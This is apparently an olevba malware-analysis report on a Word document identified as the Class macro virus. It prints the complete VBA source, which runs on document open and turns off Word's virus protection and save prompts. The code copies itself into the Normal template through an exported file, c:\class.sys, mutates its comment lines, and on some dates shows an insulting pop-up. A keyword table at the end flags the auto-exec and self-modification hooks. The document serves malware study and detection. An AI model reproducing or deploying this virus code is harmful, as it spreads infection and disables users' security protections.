olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-f29771dfa5923cb8cddade4ee4ebb4805256c0e5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-f29771dfa5923cb8cddade4ee4ebb4805256c0e5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
On Error GoTo out
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
Options.VirusProtection = False
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
Options.SaveNormalPrompt = False
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
Options.ConfirmConversions = False
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
If nt > 70 And ad > 0 Then GoTo out
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
If nt < 70 Then
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
End If
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
host.codemodule.AddFromFile ("c:\class.sys")
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
With host.codemodule
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
    For x = 1 To 4
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
    .deletelines 1
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
    Next x
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
End With
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
If nt < 70 Then
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
    With host.codemodule
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
    .replaceline 1, "Sub AutoClose()"
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
    .replaceline 71, "Sub ToolsMacro()"
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
    End With
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
End If
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
With host.codemodule
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
    For x = 2 To 72 Step 2
'Metex12.4.1999 13:08:29Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'Metex12.4.1999 13:08:30Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
    Next x
'Metex12.4.1999 13:08:30Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
End With
'Metex12.4.1999 13:08:30Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
out:
'Metex12.4.1999 13:08:30Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Metex12.4.1999 13:08:30Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
End Sub
'Metex12.4.1999 13:08:30Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
Sub ViewVBCode()
'Metex12.4.1999 13:08:30Microsoft Fax on FAX:99-04-12 Ing.Orava Lucas UN_mSvorka
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
